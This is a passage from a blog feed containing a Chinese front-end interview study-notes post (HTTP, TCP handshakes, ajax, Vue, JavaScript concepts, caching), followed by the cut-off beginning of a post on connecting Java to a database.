href="https://vevlins.github.io/2018/03/14/面试要点整理/#DOM2级模型" target="_blank" rel="noopener">DOM2级模型</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#IE事件模型" target="_blank" rel="noopener">IE事件模型</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#DOM事件模型和IE事件模型的区别" target="_blank" rel="noopener">DOM事件模型和IE事件模型的区别</a></li></ol></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#严格模式" target="_blank" rel="noopener">严格模式</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#js模块化" target="_blank" rel="noopener">js模块化</a></li></ol></li><li>缓存和离线存储<ol><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#http缓存" target="_blank" rel="noopener">http缓存</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#session-cookie-localStorage-sessionStorage" target="_blank" rel="noopener">session cookie localStorage sessionStorage</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#manifest" target="_blank" rel="noopener">manifest</a></li><li><a href="https://vevlins.github.io/2018/03/14/面试要点整理/#http缓存机制" target="_blank" rel="noopener">http缓存机制</a></li></ol></li></ol><h2 id="http相关"><a href="#http相关" class="headerlink" title="http相关"></a>http相关</h2><h3 id="https"><a href="#https" class="headerlink" title="https"></a>https</h3><p>Https可以理解为HTTP+SSL/TLS， 即 HTTP 下加入 SSL 层，即HTTP-SSL-TCP-IP,HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL，用于安全的 HTTP 数据传输.目前使用最广泛的是TLS 1.1、TLS 1.2。<br>HTTP面临的风险有：</p><ul><li>窃听风险</li><li>篡改风险</li><li>冒充风险</li></ul><p><img src="https://pic2.zhimg.com/80/v2-5e2241fae8b593ff7f3b3a308ef81c10_hd.jpg" srcset="undefined" alt="img"></p><h3 id="http2-0"><a href="#http2-0" class="headerlink" title="http2.0"></a>http2.0</h3><p>当前使用的协议是http1.1,http2.0(RFC 7540)需要现代浏览器和web服务器的支持，其发展于SPDY。<br>其特点有：</p><ul><li>二进制分帧</li><li>压缩头部</li><li>多路复用（请求优先级）</li><li>服务器推送</li></ul><h3 id="http三次握手和四次挥手"><a href="#http三次握手和四次挥手" class="headerlink" title="http三次握手和四次挥手"></a>http三次握手和四次挥手</h3><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><p>第一次握手：主机A发送位码为syn＝1,随机产生seq number=x的数据包到服务器，客户端进入SYN_SEND状态，等待服务器的确认；主机B由SYN=1知道，A要求建立联机；</p><p>第二次握手：主机B收到请求后要确认联机信息，向A发送ack number(主机A的seq+1),syn=1,ack=1,随机产生seq=y的包,此时服务器进入SYN_RECV状态;</p><p>第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1,以及位码ack是否为1，若正确，主机A会再发送ack number(主机B的seq+1),ack=1，主机B收到后确认seq值与ack=1则连接建立成功。客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p><h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><p>第一次挥手：主机1（可以使客户端，也可以是服务器端），设置Sequence Number和Acknowledgment Number，向主机2发送一个FIN报文段；此时，主机1进入FIN_WAIT_1状态；这表示主机1没有数据要发送给主机2了；</p><p>第二次挥手：主机2收到了主机1发送的FIN报文段，向主机1回一个ACK报文段，Acknowledgment Number为Sequence Number加1；主机1进入FIN_WAIT_2状态；主机2告诉主机1，我也没有数据要发送了，可以进行关闭连接了；</p><p>第三次挥手：主机2向主机1发送FIN报文段，请求关闭连接，同时主机2进入CLOSE_WAIT状态；</p><p>第四次挥手：主机1收到主机2发送的FIN报文段，向主机2发送ACK报文段，然后主机1进入TIME_WAIT状态；主机2收到主机1的ACK报文段以后，就关闭连接；此时，主机1等待2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，主机1也可以关闭连接了。</p><h3 id="常见的http头"><a href="#常见的http头" class="headerlink" title="常见的http头"></a>常见的http头</h3><h4 id="请求头："><a href="#请求头：" class="headerlink" title="请求头："></a>请求头：</h4><ul><li>Accept：接受的响应内容类型： text/plain</li><li>Cache-Control：是否使用缓存机制：no-cache</li><li>Origin：用于cors判断请求来源</li><li>Referer：访问的前一个页面</li><li>User-Agent：浏览器标识字符串</li></ul><h4 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h4><ul><li>Allow：允许的http方法</li><li>Content-Encoding：响应资源所使用的编码类型</li><li>ETag：资源版本的标识符</li><li>Expires：过期时间</li><li>Set-Cookie：设定cookie值</li></ul><h3 id="常见的http代码"><a href="#常见的http代码" class="headerlink" title="常见的http代码"></a>常见的http代码</h3><ul><li>1xx：临时响应</li><li>2xx：成功</li><li>3xx：重定向</li><li>4xx：客户端错误</li><li>5xx：服务器错误</li></ul><p>常见代码：</p><ul><li>301:永久移动</li><li>302：临时移动</li><li>304:未修改</li><li>400:不理解请求的语法</li><li>401:未授权</li><li>403:拒绝请求</li><li>405:不支持http方法</li><li>503:现在无法提供服务</li></ul><h3 id="http方法"><a href="#http方法" class="headerlink" title="http方法"></a>http方法</h3><ul><li>GET：获取资源</li><li>HEAD：获取报头</li><li>PUT：更新资源</li><li>POST：提交数据、新建资源</li><li>TRACE：检查http在过程中的变更</li><li>OPTIONS：返回支持的http方法</li><li>DELETE：删除页面</li><li>拓展方法如MOVE、COPY等</li></ul><h3 id="浏览器输入url到最终显示过程"><a href="#浏览器输入url到最终显示过程" class="headerlink" title="浏览器输入url到最终显示过程"></a>浏览器输入url到最终显示过程</h3><ul><li>DNS解析</li><li>TCP连接</li><li>发送HTTP请求</li><li>服务器处理请求并返回HTTP报文</li><li>浏览器解析渲染页面</li><li>连接结束</li></ul><h3 id="get请求和post请求的区别"><a href="#get请求和post请求的区别" class="headerlink" title="get请求和post请求的区别"></a>get请求和post请求的区别</h3><ul><li>get请求url长度受限制：url最大长度是2048个字符</li><li>get请求只能传输ascii字符</li><li>get请求可以显示在url中，所以安全性较差</li></ul><h3 id="服务器主动推送"><a href="#服务器主动推送" class="headerlink" title="服务器主动推送"></a>服务器主动推送</h3><ul><li>ajax轮询</li><li>Comet</li><li>Server-Sent</li><li>WebSocket</li></ul><h2 id="ajax相关"><a href="#ajax相关" class="headerlink" title="ajax相关"></a>ajax相关</h2><h3 id="ajax的优点"><a href="#ajax的优点" class="headerlink" title="ajax的优点"></a>ajax的优点</h3><ul><li>异步加载，优化用户体验</li><li>减少了与服务器之间不必要的传输</li><li>实现局部刷新</li><li>把服务器的负担转移到客户端</li></ul><h3 id="ajax的缺点"><a href="#ajax的缺点" class="headerlink" title="ajax的缺点"></a>ajax的缺点</h3><ul><li>不支持浏览器的历史记录</li><li>对搜索引擎的支持差</li></ul><h3 id="xml和json的比较"><a href="#xml和json的比较" class="headerlink" title="xml和json的比较"></a>xml和json的比较</h3><ul><li>xml解码难度大，json是js的子集，解析容易</li><li>xml占据了较早的市场</li><li>xml数据描述性更好</li><li>json体积小，传输速度快</li></ul><h3 id="js解析json的方法"><a href="#js解析json的方法" class="headerlink" title="js解析json的方法"></a>js解析json的方法</h3><ul><li>eval</li><li>new Function</li><li>JSON.parse</li></ul><h3 id="xmlhttprequest的readystate取值"><a href="#xmlhttprequest的readystate取值" class="headerlink" title="xmlhttprequest的readystate取值"></a>xmlhttprequest的readystate取值</h3><p>readyState属性 请求的状态 有5个可取值0=未初始化 ，1=正在加载，2=已加载，3=交互中，4=完成</p><h2 id="web安全相关"><a href="#web安全相关" class="headerlink" title="web安全相关"></a>web安全相关</h2><h3 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h3><p>csrf：跨站请求伪造。借助用户本地存储的cookie进行恶意的请求伪造。解决方案是检查其http-refer和制作token在请求中一并发送。</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>xss：跨站脚本攻击。攻击者将恶意的js代码插入到页面中。分为基于反射的，基于存储的，基于dom的。解决方案是通过检查过滤用户输入的数据。</p><h3 id="clickjacking"><a href="#clickjacking" class="headerlink" title="clickjacking"></a>clickjacking</h3><p>clickjacking：设置iframe指向其他网站并且将其设置为透明，诱骗用户填入信息并触发请求。解决方案为在响应头中设置X-Frame-Options，可选为3个DENY、SAMEORIGIN、ALLOW-FROM。</p><h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><h3 id="内容优化"><a href="#内容优化" class="headerlink" title="内容优化"></a>内容优化</h3><ul><li>减少http请求</li><li>dns预解析</li><li>减少iframe</li></ul><h3 id="服务器优化"><a href="#服务器优化" class="headerlink" title="服务器优化"></a>服务器优化</h3><ul><li>静态资源cookie隔离</li><li>cdn</li><li>gzip压缩</li><li>etag</li><li>避免空的图像src</li><li>开启缓存</li></ul><h3 id="js优化"><a href="#js优化" class="headerlink" title="js优化"></a>js优化</h3><ul><li>减少dom操作</li><li>减少长作用域链查找</li><li>在底部加载</li></ul><h3 id="css优化"><a href="#css优化" class="headerlink" title="css优化"></a>css优化</h3><ul><li>采用link而不是import</li><li>css放在顶部</li><li>尽量避免使用css表达式</li><li>减少选择器嵌套</li><li>减少css动画</li></ul><h3 id="图片优化"><a href="#图片优化" class="headerlink" title="图片优化"></a>图片优化</h3><ul><li>压缩图片</li><li>sprites</li><li>使用图标字体</li><li>懒加载</li></ul><h2 id="vue相关"><a href="#vue相关" class="headerlink" title="vue相关"></a>vue相关</h2><h3 id="mvvm和mvc"><a href="#mvvm和mvc" class="headerlink" title="mvvm和mvc"></a>mvvm和mvc</h3><ul><li>mvc：view-controller-model-view 单向传递</li><li>mvvm：view-viewmodel-model 双向传递</li></ul><h3 id="vue双向数据绑定"><a href="#vue双向数据绑定" class="headerlink" title="vue双向数据绑定"></a>vue双向数据绑定</h3><p>通过Object.defineProperty()实现数据劫持，在数据变动时发布消息给订阅者，触发相应的监听回调。</p><ul><li>实现一个数据监听器Observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者。defineProperty</li><li>实现一个指令解析器Compile，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数。createDocumentFragment</li><li>实现一个Watcher，作为连接Observer和Compile的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图。 订阅发布模式定义了一种一对多的关系，让多个观察者同时监听某一个主题对象，这个主题对象的状态发生改变时就会通知所有观察者对象</li><li>mvvm入口函数，整合以上三者</li></ul><h3 id="vue生命周期"><a href="#vue生命周期" class="headerlink" title="vue生命周期"></a>vue生命周期</h3><p>beforeCreate（创建前）,created（创建后），beforeMount(载入前),mounted（载入后）,beforeUpdate（更新前）,updated（更新后）,beforeDestroy（销毁前）,destroyed（销毁后）</p><h3 id="vue组件通信"><a href="#vue组件通信" class="headerlink" title="vue组件通信"></a>vue组件通信</h3><ul><li>父组件向子组件传递：父组件写在标签内，子组件通过通过props获取</li><li>子组件向父组件传递：<code>$emit</code>发送事件</li><li>兄弟组件传递：实例化一个第三方vue实例，<code>$emit</code>触发事件,<code>$on</code>接收事件</li></ul><h3 id="vuex的作用"><a href="#vuex的作用" class="headerlink" title="vuex的作用"></a>vuex的作用</h3><p>VueX 是一个专门为 Vue.js 应用设计的状态管理架构，统一管理和维护各个vue组件的可变化状态。当单独使用Vue.js,我们常常倾向于存储状态我们的组件内。也就是说,每个组件属于我们的应用程序状态,因此结果状态乱扔的到处都是。然而,有时一块状态需要由多个组件共享。常见的做法是让一个组件“发送”一些使用自定义事件系统其他组件。这种模式的问题是内部的事件流大组件树很快就变得复杂,通常很难原因时出现错误。</p><h3 id="vue1-0和vue2-0的区别是什么"><a href="#vue1-0和vue2-0的区别是什么" class="headerlink" title="vue1.0和vue2.0的区别是什么"></a>vue1.0和vue2.0的区别是什么</h3><ul><li>vue2.0代码必须包裹在一个根元素</li><li>vue2.0的生命周期发生了很大的变化</li></ul><h2 id="js相关"><a href="#js相关" class="headerlink" title="js相关"></a>js相关</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>基本数据类型：String、Number、Boolean、Undefined、Null、Symbol</li><li>引用类型：object、array、function</li></ul><h3 id="判断数据类型"><a href="#判断数据类型" class="headerlink" title="判断数据类型"></a>判断数据类型</h3><ul><li>typeof：对null返回object、无法判断array、date等类型</li><li>instanceof：检测两个对象是否实例关系</li><li>constructor：无法判断null和undefined，重写prototype之后constructor丢失默认为Object</li><li>Object.prototype.toString.call</li></ul><h3 id="高级函数"><a href="#高级函数" class="headerlink" title="高级函数"></a>高级函数</h3><p>惰性函数、柯里化、</p><h4 id="惰性载入函数"><a href="#惰性载入函数" class="headerlink" title="惰性载入函数"></a>惰性载入函数</h4><p>在浏览器功能检测中，函数的分支当第一次确定时就将分支内的函数作为返回值，这样就改变了这个函数。在以后加载中避免了每次都判断。</p><pre><code>function addEvent (type, element, fun) {    if (element.addEventListener) {        addEvent = function (type, element, fun) {            element.addEventListener(type, fun, false);        }    }    else if(element.attachEvent){        addEvent = function (type, element, fun) {            element.attachEvent(&#39;on&#39; + type, fun);        }    }    else{        addEvent = function (type, element, fun) {            element[&#39;on&#39; + type] = fun;        }    }    return addEvent(type, element, fun);}</code></pre><h4 id="安全的类型检测"><a href="#安全的类型检测" class="headerlink" title="安全的类型检测"></a>安全的类型检测</h4><p>通过toString方法来检测传入参数的类型，以判断是否进行下一步操作。</p><pre><code>  Object.prototype.toString.call(value)</code></pre><h4 id="作用域安全的构造函数"><a href="#作用域安全的构造函数" class="headerlink" title="作用域安全的构造函数"></a>作用域安全的构造函数</h4><p>构造函数如果没有new，那么构造函数内部的this指向全局也就是window对象。先用instance判断一下this指向，如果不是指向构造函数，那么返回一个new实例化的对象。</p><pre><code>function Person(name){    if(this instanceof Person){        this.name = name;    }else{        return new Person(name)    }}</code></pre><h4 id="函数柯里化"><a href="#函数柯里化" class="headerlink" title="函数柯里化"></a>函数柯里化</h4><p>它用于创建已经设置好了一个或者多个参数的函数，函数柯里化的基本方法和函数绑定是一样的，使用一个闭包返回一个函数。</p><pre><code> //普通的add版本function add(num1, num2){    return num1 + num2;}//第一个参数为5的add版本function curriedAdd5(num2){    return add(5, num2)}function curry(fn, context){//截取调用curry时候，除了fn,context,之后的所有参数    var args =[].slice.call(arguments,2);    return function(){//获取调用fn的所有参数        var totalArgs = args.concat([].slice.call(arguments));        return fn.apply(context, totalArgs);    }}var curriedAdd5 = curry(add, null, 5)</code></pre><h3 id="判断数组"><a href="#判断数组" class="headerlink" title="判断数组"></a>判断数组</h3><ul><li>instanceof</li><li>toString</li><li>constructor</li></ul><h3 id="箭头函数和this"><a href="#箭头函数和this" class="headerlink" title="箭头函数和this"></a>箭头函数和this</h3><p>箭头函数没有它自己的this值，箭头函数内的this值继承自外围作用域。箭头函数的this其实就是在定义的时候就确定好的，以后不管怎么调用这个箭头函数，箭头函数的this始终为定义时的this。箭头函数没有arguments，可以用剩余参数代替。箭头函数不要再对象的方法中、作为构造函数、定义原型方法时使用。</p><h3 id="this指向"><a href="#this指向" class="headerlink" title="this指向"></a>this指向</h3><ul><li>函数调用模式-全局调用：指向全局对象也就是window，包括在函数方法中嵌套的</li><li>方法调用模式：指向上层对象</li><li>构造器调用模式：通过new构造的this指向新的对象</li><li>apply、call、bind等调用模式：指向传入的对象</li></ul><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>只有函数可以限定一个变量的作用范围，即函数才是变量的作用域。在ES6之前，JavaScript没有块级作用域(一对花括号{}即为一个块级作用域)，只有全局作用域和函数作用域。</p><h3 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h3><p>函数在运行的瞬间，生成一个活动对象（Active Object），简称AO</p><ul><li>第一步：分析参数：函数接收形式参数，添加到AO的属性，并且这个时候值为undefine,即AO.age=undefined，接收实参，添加到AO的属性，覆盖之前的undefined</li><li>第二步：分析变量声明：如var age;或var age=18;如果上一步分析参数中AO还没有age属性，则添加AO属性为undefined，即AO.age=undefine，如果AO上面已经有age属性了，则不作任何修改</li><li>第三步：分析函数的声明：如果有function age(){}把函数赋给AO.age ,覆盖上一步分析的值</li></ul><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>首字母大写，内部用this的函数，最后通过new来进行实例化。<br>构造函数的返回值有以下几种情况：</p><ul><li>没有返回值时返回实例化的对象。</li><li>返回值为基本数据类型时返回实例化的对象，用来两用函数。</li><li>返回值为引用类型时，返回该引用类型。</li></ul><h3 id="new的操作"><a href="#new的操作" class="headerlink" title="new的操作"></a>new的操作</h3><p>相当于以下步骤：</p><pre><code>var obj = {}obj._proto_ = Co.prototyoeCo.call(obj)return obj</code></pre><h3 id="promise和async-await"><a href="#promise和async-await" class="headerlink" title="promise和async/await"></a>promise和async/await</h3><p>promise的三种状态pending（进行中）、fulfilled（已成功）和rejected（已失败）。两个参数resolve和reject。</p><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>闭包是由函数以及创建该函数的词法环境组合而成。这个环境包含了这个闭包创建时所能访问的所有局部变量。(MDN)用来访问另一个函数作用域链上的变量的函数。由于该变量被其他函数饮用所以内存回收机制导致其不会立即清除，也就是其定义时的上下文被记住，起到了记忆功能。</p><h3 id="js对象私有变量"><a href="#js对象私有变量" class="headerlink" title="js对象私有变量"></a>js对象私有变量</h3><ul><li>_开头的编码约定</li><li>基于闭包构造特权函数，缺点是无法挂载在prototype上，无法实现共享</li><li>强引用散列表</li><li>基于ES6的WeakMap</li></ul><h3 id="js垃圾回收机制"><a href="#js垃圾回收机制" class="headerlink" title="js垃圾回收机制"></a>js垃圾回收机制</h3><p>JavaScript的解释器可以检测到何时程序不再使用一个对象了，当他确定了一个对象是无用的时候，他就知道不再需要这个对象，可以把它所占用的内存释放掉了。现在各大浏览器通常用采用的垃圾回收有两种方法：标记清除、引用计数。优化垃圾回收的主要思想是避免新建对象，而是尽量复用。比如delete obj的属性，而非new Object()。设置arr.length = 0而非 arr = []。</p><p>可能会导致内存泄漏的操作有：</p><ul><li>意外的全局变量</li><li>被遗忘的定时器或回调</li><li>没有清理的DOM元素引用</li><li>不恰当的闭包</li></ul><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p><img src="https://pic1.zhimg.com/80/e83bca5f1d1e6bf359d1f75727968c11_hd.jpg" srcset="undefined" alt="img"></p><h3 id="rhs和lhs"><a href="#rhs和lhs" class="headerlink" title="rhs和lhs"></a>rhs和lhs</h3><p>rhs为取值，lhs为赋值。<br>如果在rhs的所有嵌套的作用域查询中都无法找到该变量,js引擎就会抛出一个ReferenceError异常. ReferenceError是一个重要的异常.<br>相较之下， 当引擎执行 LHS 查询时， 如果在顶层（ 全局作用域） 中也无法找到目标变量，<br>全局作用域中就会创建一个具有该名称的变量， 并将其返还给引擎， 前提是程序运行在非 “ 严格模式” 下。</p><h3 id="EventLoop"><a href="#EventLoop" class="headerlink" title="EventLoop"></a>EventLoop</h3><p>函数调用形成了一个栈帧。对象被分配在一个堆中，即用以表示一个大部分非结构化的内存区域。一个待处理的消息队列。当栈拥有足够内存时并且满足触发条件(如setTimeout)从队列中取出一个消息进行处理。一个 web worker 或者一个跨域的iframe都有自己的栈，堆和消息队列。两个不同的运行时只能通过 postMessage方法进行通信。如果后者侦听到message事件，则此方法会向其他运行时添加消息。</p><p>js所谓的单线程，是指在JS引擎中负责解释和执行JavaScript代码的线程只有一个。不妨叫它主线程。实际上还存在其他的线程。例如：处理AJAX请求的线程、处理DOM事件的线程、定时器线程、读写文件的线程(例如在Node.js中)等等。这些线程可能存在于JS引擎之内，也可能存在于JS引擎之外，在此我们不做区分。不妨叫它们工作线程。</p><p>一个异步过程：主线程发起一个异步请求，相应的工作线程接收请求并告知主线程已收到(异步函数返回)；主线程可以继续执行后面的代码，同时工作线程执行异步任务；工作线程完成工作后，通知主线程；主线程收到通知后，执行一定的动作(调用回调函数)。</p><h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><p>HTTP 协议有一个缺陷：通信只能由客户端发起。HTTP 协议做不到服务器主动向客户端推送信息。WebSocket最大的特点就是服务器可以主动向服务器发送信息，客户端也可以向服务器端主动发送信息。SSE是单向推送，利用EventSource，content-type设置为text/event-stream。</p><p>特点有以下：</p><ul><li>建立在TCP之上</li><li>默认端口也是ws80和wss443，握手阶段采用http协议。</li><li>数据格式轻，性能开销小</li><li>可以发送文本和二进制文件</li><li>没有同源策略的限制</li></ul><p>客户端API：</p><ul><li>var ws = new WebSocket(‘ws://localhost:8080’);</li><li>webSocket.readyState 0=正在连接 1=连接成功 2=连接正在关闭 3=连接已经关闭</li><li>ws.onopen= function(){} 连接成功后的回调函数</li><li>ws.onclose = function(){} 连接关闭后的回调函数</li><li>onmessage 收到信息后 event.data instanceof ArrayBuffer || String</li><li>ws.send(‘your message’);</li><li>ws.bufferedAmount 还有多少字节没有发送完 判断是否发送完毕</li><li>ws.onerror</li></ul><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><ul><li>原型链</li><li>构造函数</li><li>组合继承</li><li>原型式继承</li><li>寄生式继承</li><li>寄生组合式继承</li></ul><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><ul><li>工厂模式</li><li>构造函数模式</li><li>原型模式</li><li>组合模式</li><li>动态原型模式</li><li>寄生构造模式</li><li>稳妥构造模式</li></ul><h3 id="js跨域"><a href="#js跨域" class="headerlink" title="js跨域"></a>js跨域</h3><p>同源策略要求三个相同：协议相同、域名相同、端口相同</p><ul><li>cors</li><li>图像ping</li><li>jsonp</li><li>iframe+document.domain：适用于主域相同而子域不同的情况，设置相同的domain，然后在a页面中创建b页面的iframe，获取ifr.contentDocument就可以操作b</li><li>iframe+location.hash:src指向目标，hash中带参数，目标页面处理之后设置一个src指向代理文件，代理文件通过parent.parent.location.hash向源文件传递参数，源文件通过hashchange事件获取hash</li><li>iframe+window.name:window.name2MB而且在页面切换后不会变，先iframe.src指向跨域地址，在onload时转向当前域下一空文件，之前取到的window.name依然不变</li><li>代理服务器</li><li>postmessage</li></ul><h3 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h3><ul><li>comet</li><li>sse</li><li>websocket</li></ul><h3 id="多页面传参数"><a href="#多页面传参数" class="headerlink" title="多页面传参数"></a>多页面传参数</h3><ul><li>cookie轮询</li><li>localStorage和storage事件</li><li>websocket</li></ul><h3 id="深拷贝和浅拷贝"><a href="#深拷贝和浅拷贝" class="headerlink" title="深拷贝和浅拷贝"></a>深拷贝和浅拷贝</h3><p>浅拷贝分两种情况，拷贝直接拷贝源对象的引用 和 源对象拷贝实例.对于第二种情况，常用方法为<code>Array.prototype.slice(), Array.prototype.concat(), jQury的$.extend({},obj)</code></p><pre><code>function shallowCopy(src) {  var dst = {};  for (var prop in src) {    if (src.hasOwnProperty(prop)) {      dst[prop] = src[prop];    }  }  return dst;}</code></pre><p>深拷贝后，两个对象，包括其内部的元素互不干扰。常见方法有JSON.parse(),JSON.stringify()，jQury的<code>$.extend(true,{},obj)</code>，lodash的<code>_.cloneDeep和_.clone(value, true)。</code>有两种解决方案：</p><pre><code>JSON.parse(JSON.stringify(test))function clone(p,s){　　var s=s||{};　　for(var prop in p){　　　　if(typeof p[prop]==&#39;object&#39;){　　　　　　　　s[prop]=(p[prop].constructor===Array)?[]:{};//三元运算，将s[prop]初始化为数组或者对象　　　　　　　　clone(p[prop],s[prop])　　　　}　　　　else{　　　　　　s[prop]=p[prop];　　　　}};　　　　return s;};</code></pre><h3 id="js事件模型"><a href="#js事件模型" class="headerlink" title="js事件模型"></a>js事件模型</h3><h4 id="DOM0级模型"><a href="#DOM0级模型" class="headerlink" title="DOM0级模型"></a>DOM0级模型</h4><p>又称原始事件模型，事件不会传播，没有事件流的概念。事件绑定通过在html代码中直接写<code>onclick</code> 或者在js中通过<code>.onclick=xxx</code>实现，如果取消可以将其指向<code>null</code>。</p><h4 id="DOM2级模型"><a href="#DOM2级模型" class="headerlink" title="DOM2级模型"></a>DOM2级模型</h4><p>分为事件捕获阶段，事件处理阶段，事件冒泡阶段。通过 <code>addEventListener</code>和<code>removeEventListener</code>。<br>参数有三个：</p><ul><li>eventType指定事件类型(不要加on)</li><li>handler是事件处理函数</li><li>useCapture是一个boolean用于指定是否在捕获阶段进行处理，一般设置为false与IE浏览器保持一致。</li></ul><h4 id="IE事件模型"><a href="#IE事件模型" class="headerlink" title="IE事件模型"></a>IE事件模型</h4><p>事件处理和事件冒泡阶段。<br><code>attachEvent</code>和<code>detachEvent</code></p><h4 id="DOM事件模型和IE事件模型的区别"><a href="#DOM事件模型和IE事件模型的区别" class="headerlink" title="DOM事件模型和IE事件模型的区别"></a>DOM事件模型和IE事件模型的区别</h4><ul><li>event和window.event</li><li>target和srcElement</li><li>stopPropagation和cancelBubble</li><li>preventDefault和returnValue</li></ul><h3 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h3><p>可以在全局最顶端声明，也可以在某个函数顶端声明。</p><ul><li>全局变量必须显式声明</li><li>禁止使用with语句</li><li>eval自己存在独立的作用域</li><li>禁止this指向全局对象</li><li>禁止删除变量</li><li>禁止重名</li></ul><h3 id="js模块化"><a href="#js模块化" class="headerlink" title="js模块化"></a>js模块化</h3><ul><li>无模块化：分js文件写script。缺点是污染全局作用域和依赖关系不明显。</li><li>CommonJS：CommonJS的核心思想就是通过 require 方法来同步加载所要依赖的其他模块，然后通过 exports 或者 module.exports 来导出需要暴露的接口。用于node端，同步加载模块，不适用于浏览器端。</li><li>AMD：require.js。通过define来定义一个模块，然后使用require来加载一个模块。前置加载依赖。</li><li>CMD：sea.js，按需加载，依赖就近。</li><li>ES6模块化：import导入，export导出。</li></ul><h2 id="缓存和离线存储"><a href="#缓存和离线存储" class="headerlink" title="缓存和离线存储"></a>缓存和离线存储</h2><h3 id="http缓存"><a href="#http缓存" class="headerlink" title="http缓存"></a>http缓存</h3><ul><li>判断Cache-Control或者expires，如果未过期，直接读取http缓存文件，不发送http请求。</li><li>判断是否有etag，有则带上if-none-mathch发送请求，未修改返回304，修改返回200。</li><li>判断是否有last-modified，有则带上if-modified-since，有效返回200，无效返回304。</li></ul><p><img src="https://images2017.cnblogs.com/blog/621603/201709/621603-20170925162600417-90375901.png" srcset="undefined" alt="img"><br><code>crtl+f5</code>可以强制刷新。</p><h3 id="session-cookie-localStorage-sessionStorage"><a href="#session-cookie-localStorage-sessionStorage" class="headerlink" title="session cookie localStorage sessionStorage"></a>session cookie localStorage sessionStorage</h3><ul><li>session和cookie<br>session存在服务器端，cookie存在浏览器端。cookie只能保存字符串类型，session通过类似于hashtable的数据结构存储任何类型的对象。cookie4kb，session无限制。session更安全。</li><li>localStorage sessionStorage<br>localStorage永久，sessionStorage仅在当前会话下有效，关闭浏览器窗口失效。存储都是5MB。都存在客户端，只能存文本类型。lcoalStorage的接口有getItem、setItem、removeItem、clear，另外存储时还会触发storage事件。</li></ul><h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>``</p><p>其分为三个部分：</p><ul><li>CACHE MANIFEST 缓存</li><li>NETWORK 不缓存</li><li>FALLBACK 无法访问时的回退</li></ul><p>window.applicationCache.status可以访问缓存状态，分别为：UNCACHED、IDLE、CHECKING、DOWNLOADING、UPDATEREADY、IDLE</p><p>离线缓存与传统浏览器缓存区别：</p><ul><li>离线缓存是针对整个应用，浏览器缓存是单个文件</li><li>离线缓存断网了还是可以打开页面，浏览器缓存不行</li><li>离线缓存可以主动通知浏览器更新资源</li></ul><h3 id="http缓存机制"><a href="#http缓存机制" class="headerlink" title="http缓存机制"></a>http缓存机制</h3><ul><li>Cache-Control：响应头表示了资源是否可以被缓存，以及缓存的有效期。</li><li>Etag：响应头标识了资源的版本，此后浏览器可据此进行缓存以及询问服务器。</li><li>Last-Modified：响应头标识了资源的修改时间，此后浏览器可据此进行缓存以及询问服务器。</li></ul><p>缓存策略三要素：</p><ul><li>缓存存储策略</li><li>缓存过期策略</li><li>缓存对比策略</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java连接数据库</title>
    <link href="undefined2019/12/01/java%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>2019/12/01/java%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h3 id="首先需要加入sql外驱动包"><a href="#首先需要加入sql外驱动包" class="headerlink" title="首先需要加入sql外驱动包"></a>首先需要加入sql外驱动包</h3><p>百度云链接：<a href="https://pan.baidu.com/s/1zWb2uRXlIIwL_LiQ5pANYQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1zWb2uRXlIIwL_LiQ5pANYQ</a>  提取码：zywf</p><h3 id="然后将此包放入自己的项目目录下"><a href="#然后将此包放入自己的项目目录下" class="headerlink" title="然后将此包放入自己的项目目录下"></a>然后将此包放入自己的项目目录下</h3><p>然后将此包部署一下：</p><p><img src="https://ae01.alicdn.com/kf/H93aff8ac98e4448c9ef184ac934c2a6dD.jpg" srcset="undefined" alt=""></p><p><img src="https://ae01.alicdn.com/kf/Hf201d8dce26d4cc88df57abd45b32ad3h.jpg" srcset="undefined" alt=""></p><p>部署完成后会在项目目录下显示</p><p><img src="https://ae01.alicdn.com/kf/H1392a7af91de45df9a5f4c4f09ffa4a5s.jpg" srcset="undefined" alt=""></p><h3 id="然后在项目下面新建java包"><a href="#然后在项目下面新建java包" class="headerlink" 